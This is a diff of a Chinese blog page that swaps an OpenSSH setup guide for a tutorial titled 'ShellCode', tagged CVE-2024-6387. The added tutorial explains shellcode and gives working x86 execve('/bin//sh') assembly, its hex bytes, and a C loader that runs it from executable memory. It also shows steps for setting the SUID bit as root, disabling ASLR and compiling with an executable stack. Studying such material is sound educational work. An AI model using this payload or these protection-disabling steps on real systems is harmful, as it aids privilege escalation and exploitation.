@@ -18,22 +18,22 @@
   <meta name="author" content="prelearn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、安装操作1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括： ssh：用于安全远程登录。 scp：用于安全复制文件。 sftp：用于安全文件传输。 ssh-keygen：用于生成和管理SSH密钥。 ssh-copy-id：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。   Ope">
+    <meta name="description" content="ubuntu(16 32位)概述什么是shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 汇编码与机器码机器码可以直接在CPU运行的代码，一般就是可以用二">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSH-操作">
-<meta property="og:url" content="https://prelearn-code.github.io/2024/07/22/SSH-%E6%93%8D%E4%BD%9C/index.html">
+<meta property="og:title" content="ShellCode">
+<meta property="og:url" content="https://prelearn-code.github.io/2024/07/29/ShellCode/index.html">
 <meta property="og:site_name" content="prelearn-code">
-<meta property="og:description" content="一、安装操作1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括： ssh：用于安全远程登录。 scp：用于安全复制文件。 sftp：用于安全文件传输。 ssh-keygen：用于生成和管理SSH密钥。 ssh-copy-id：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。   Ope">
+<meta property="og:description" content="ubuntu(16 32位)概述什么是shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 汇编码与机器码机器码可以直接在CPU运行的代码，一般就是可以用二">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-07-22T08:20:41.000Z">
-<meta property="article:modified_time" content="2024-07-29T00:59:33.394Z">
+<meta property="article:published_time" content="2024-07-29T01:04:16.000Z">
+<meta property="article:modified_time" content="2024-07-29T01:05:35.886Z">
 <meta property="article:author" content="prelearn">
-<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="CVE">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>SSH-操作 - prelearn-code</title>
+  <title>ShellCode - prelearn-code</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SSH-操作"></span>
+            <span id="subtitle" data-typed-text="ShellCode"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-22 16:20" pubdate>
-          2024年7月22日 下午
+        <time datetime="2024-07-29 09:04" pubdate>
+          2024年7月29日 上午
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          779 字
+          482 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          7 分钟
+          5 分钟
         
       </span>
     
@@ -270,68 +270,42 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SSH-操作</h1>
+            <h1 id="seo-header">ShellCode</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="一、安装操作"><a href="#一、安装操作" class="headerlink" title="一、安装操作"></a>一、安装操作</h1><h2 id="1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括："><a href="#1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：" class="headerlink" title="1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括："></a>1. <strong>OpenSSH Client（openssh-client）</strong>：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：</h2><ul>
-<li><code>ssh</code>：用于安全远程登录。</li>
-<li><code>scp</code>：用于安全复制文件。</li>
-<li><code>sftp</code>：用于安全文件传输。</li>
-<li><code>ssh-keygen</code>：用于生成和管理SSH密钥。</li>
-<li><code>ssh-copy-id</code>：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。</li>
+                <h1 id="ubuntu-16-32位"><a href="#ubuntu-16-32位" class="headerlink" title="ubuntu(16 32位)"></a>ubuntu(16 32位)</h1><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p>
+<h2 id="汇编码与机器码"><a href="#汇编码与机器码" class="headerlink" title="汇编码与机器码"></a>汇编码与机器码</h2><h3 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p>
+<h3 id="汇编码"><a href="#汇编码" class="headerlink" title="汇编码"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p>
+<h1 id="shellcode代码"><a href="#shellcode代码" class="headerlink" title="shellcode代码"></a>shellcode代码</h1><h2 id="汇编代码-目标机32bit的ubuntu16"><a href="#汇编代码-目标机32bit的ubuntu16" class="headerlink" title="汇编代码(目标机32bit的ubuntu16)"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用汇编码"><a href="#使用汇编码" class="headerlink" title="使用汇编码"></a>使用汇编码</h2><h3 id="1-上述代码保存为文件（shellcode-asm）"><a href="#1-上述代码保存为文件（shellcode-asm）" class="headerlink" title="1.上述代码保存为文件（shellcode.asm）"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim shellcode.asm<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-进行汇编"><a href="#2-进行汇编" class="headerlink" title="2.进行汇编"></a>2.进行汇编</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure>
+<h3 id="3-进行链接"><a href="#3-进行链接" class="headerlink" title="3.进行链接"></a>3.进行链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-设置SUID位（可选）"><a href="#4-设置SUID位（可选）" class="headerlink" title="4.设置SUID位（可选）"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure>
+<h3 id="5-禁用ASLR（可选）"><a href="#5-禁用ASLR（可选）" class="headerlink" title="5.禁用ASLR（可选）"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-运行可执行文件"><a href="#6-运行可执行文件" class="headerlink" title="6.运行可执行文件"></a>6.运行可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./shellcode<br></code></pre></td></tr></table></figure>
+
+<h2 id="汇编代码转为机器码"><a href="#汇编代码转为机器码" class="headerlink" title="汇编代码转为机器码"></a>汇编代码转为机器码</h2><h3 id="编译为二进制文件"><a href="#编译为二进制文件" class="headerlink" title="编译为二进制文件"></a>编译为二进制文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure>
+<h3 id="查看机器码并转为所需格式"><a href="#查看机器码并转为所需格式" class="headerlink" title="查看机器码并转为所需格式"></a>查看机器码并转为所需格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xxd -p shellcode.bin | sed &#x27;s/\(..\)/\\x\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure>
+<h2 id="16进制机器码"><a href="#16进制机器码" class="headerlink" title="16进制机器码"></a>16进制机器码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">\x66\x31\xc0\x66\x50\x66\xbb\x2f\x2f\x73\x68\x66<br>\x53\x66\xbb\x2f\x62\x69\x6e\x66\x53\x66\x89\xe3<br>\x66\x50\x66\x53\x66\x89<br>\xe1\x66\x31\xd2\xb0\x0b\xcd\x80<br></code></pre></td></tr></table></figure>
+
+<h2 id="C语言使用机器码"><a href="#C语言使用机器码" class="headerlink" title="C语言使用机器码"></a>C语言使用机器码</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">// Shellcode</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-string">&quot;\x31\xc0\x50\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Print shellcode length</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length: %ld\n&quot;</span>, <span class="hljs-built_in">strlen</span>(shellcode));<br><br>    <span class="hljs-comment">// Allocate executable memory</span><br>    <span class="hljs-type">void</span> *exec = mmap(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy shellcode to allocated memory</span><br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// Execute shellcode</span><br>    <span class="hljs-type">void</span> (*execute_shellcode)() = (<span class="hljs-type">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class="hljs-comment">// Cleanup</span><br>    munmap(exec, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><ul>
+<li>开启shell窗口。</li>
 </ul>
-<ol start="2">
-<li><strong>OpenSSH Server（openssh-server）</strong>：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：<ul>
-<li><code>sshd</code>：SSH守护进程，处理和管理SSH连接。</li>
-<li>配置文件通常位于<code>/etc/ssh/sshd_config</code>，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。</li>
-</ul>
-</li>
-</ol>
-<p>要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -l | grep openssh<br><br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openssh-client openssh-server<br></code></pre></td></tr></table></figure>
 
-<h1 id="二、查看SSH服务的版本"><a href="#二、查看SSH服务的版本" class="headerlink" title="二、查看SSH服务的版本"></a>二、查看SSH服务的版本</h1><h2 id="1-查看OpenSSH客户端版本："><a href="#1-查看OpenSSH客户端版本：" class="headerlink" title="1. 查看OpenSSH客户端版本："></a>1. <strong>查看OpenSSH客户端版本</strong>：</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -V<br></code></pre></td></tr></table></figure>
-<p>   这将输出类似于以下的信息：<br>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OpenSSH_8</span>.<span class="hljs-number">9</span>p1, OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>n  <span class="hljs-number">15</span> Mar <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure></p>
-<h2 id="2-查看OpenSSH服务器版本："><a href="#2-查看OpenSSH服务器版本：" class="headerlink" title="2. 查看OpenSSH服务器版本："></a>2. <strong>查看OpenSSH服务器版本</strong>：</h2><p>   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -V localhost<br></code></pre></td></tr></table></figure><br>   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找<code>sshd</code>守护进程的版本：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sshd -T | grep version<br></code></pre></td></tr></table></figure><br>   这将输出类似于以下的信息：<br>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sshd</span> version OpenSSH_8.<span class="hljs-number">9</span>p1, OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>n  <span class="hljs-number">15</span> Mar <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure></p>
-<h1 id="三、启动操作"><a href="#三、启动操作" class="headerlink" title="三、启动操作"></a>三、启动操作</h1><h2 id="1-开启端口防火墙策略"><a href="#1-开启端口防火墙策略" class="headerlink" title="1.开启端口防火墙策略"></a>1.开启端口防火墙策略</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install ufw<br>sudo ufw enable<br>sudo ufw allow 22<br>sudo ufw status<br></code></pre></td></tr></table></figure>
-
-<h2 id="2-自定义开放端口-可选"><a href="#2-自定义开放端口-可选" class="headerlink" title="2.自定义开放端口(可选)"></a>2.自定义开放端口(可选)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ufw allow 2222<br>sudo ufw status<br></code></pre></td></tr></table></figure>
-<h2 id="3-启动SSH服务"><a href="#3-启动SSH服务" class="headerlink" title="3.启动SSH服务"></a>3.启动SSH服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl start ssh<br>sudo systemctl enable ssh  //自启动命令<br>sudo systemctl status ssh<br><br>/etc/ssh/sshd_config   // 配置文件所在位置<br></code></pre></td></tr></table></figure>
-
-<h1 id="四、退出操作（exit）"><a href="#四、退出操作（exit）" class="headerlink" title="四、退出操作（exit）"></a>四、退出操作（exit）</h1><h3 id="方法1：使用exit命令"><a href="#方法1：使用exit命令" class="headerlink" title="方法1：使用exit命令"></a>方法1：使用<code>exit</code>命令</h3><p>在SSH会话中，可以使用<code>exit</code>命令退出会话并断开连接：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
-
-<p>或者按 <code>Ctrl+D</code> 组合键，也可以关闭当前的SSH会话。</p>
-<h3 id="方法2：使用logout命令"><a href="#方法2：使用logout命令" class="headerlink" title="方法2：使用logout命令"></a>方法2：使用<code>logout</code>命令</h3><p>在某些系统上，可以使用<code>logout</code>命令断开SSH连接：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="方法3：关闭终端"><a href="#方法3：关闭终端" class="headerlink" title="方法3：关闭终端"></a>方法3：关闭终端</h3><p>如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。</p>
-<h3 id="方法4：使用kill命令（强制断开）"><a href="#方法4：使用kill命令（强制断开）" class="headerlink" title="方法4：使用kill命令（强制断开）"></a>方法4：使用<code>kill</code>命令（强制断开）</h3><p>如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：</p>
-<ol>
-<li><p>找到SSH进程的PID：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep ssh<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>使用<code>kill</code>命令终止进程（替换<code>&lt;PID&gt;</code>为实际的进程ID）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> &lt;PID&gt;<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>如果<code>kill</code>命令无法终止进程，可以使用<code>kill -9</code>强制终止：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 &lt;PID&gt;<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="方法5：使用tmux或screen分离会话（可选）"><a href="#方法5：使用tmux或screen分离会话（可选）" class="headerlink" title="方法5：使用tmux或screen分离会话（可选）"></a>方法5：使用<code>tmux</code>或<code>screen</code>分离会话（可选）</h3><p>如果你在SSH会话中使用了<code>tmux</code>或<code>screen</code>，可以分离（detach）会话，而不会真正断开连接：</p>
-<ul>
-<li>在<code>tmux</code>中，按下 <code>Ctrl+B</code> 然后按 <code>D</code> 键。</li>
-<li>在<code>screen</code>中，按下 <code>Ctrl+A</code> 然后按 <code>D</code> 键。</li>
-</ul>
-<p>这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。</p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设你当前在SSH会话中，只需键入<code>exit</code>并按回车即可：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
-
-
-<h1 id="五、认证操作"><a href="#五、认证操作" class="headerlink" title="五、认证操作"></a>五、认证操作</h1><h2 id="（1）账号密码连接"><a href="#（1）账号密码连接" class="headerlink" title="（1）账号密码连接"></a>（1）账号密码连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh ubuntu@192.168.179.141<br></code></pre></td></tr></table></figure>
-
-<h2 id="（2）公私钥认证连接"><a href="#（2）公私钥认证连接" class="headerlink" title="（2）公私钥认证连接"></a>（2）公私钥认证连接</h2>
                 
               </div>
             
@@ -349,12 +323,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" class="category-chain-item">网络协议</a>
+  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
   
   
     <span>></span>
     
-  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/SSH/" class="category-chain-item">SSH</a>
+  <a href="/categories/CVE/CVE-2024-6387/" class="category-chain-item">CVE-2024-6387</a>
   
   
 
@@ -371,7 +345,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/SSH/" class="print-no-link">#SSH</a>
+        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
       
     </div>
   
@@ -383,8 +357,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SSH-操作</div>
-      <div>https://prelearn-code.github.io/2024/07/22/SSH-操作/</div>
+      <div>ShellCode</div>
+      <div>https://prelearn-code.github.io/2024/07/29/ShellCode/</div>
     </div>
     <div class="license-meta">
       
@@ -396,7 +370,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年7月22日</div>
+          <div>2024年7月29日</div>
         </div>
       
       
@@ -433,18 +407,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/22/04%20BTC-%E5%AE%9E%E7%8E%B0/" title="04 BTC-实现">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">04 BTC-实现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/22/SSH-%E7%90%86%E8%AE%BA/" title="SSH-理论">
-                        <span class="hidden-mobile">SSH-理论</span>
+                      <a href="/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/" title="03-ETH-状态树">
+                        <span class="hidden-mobile">03-ETH-状态树</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
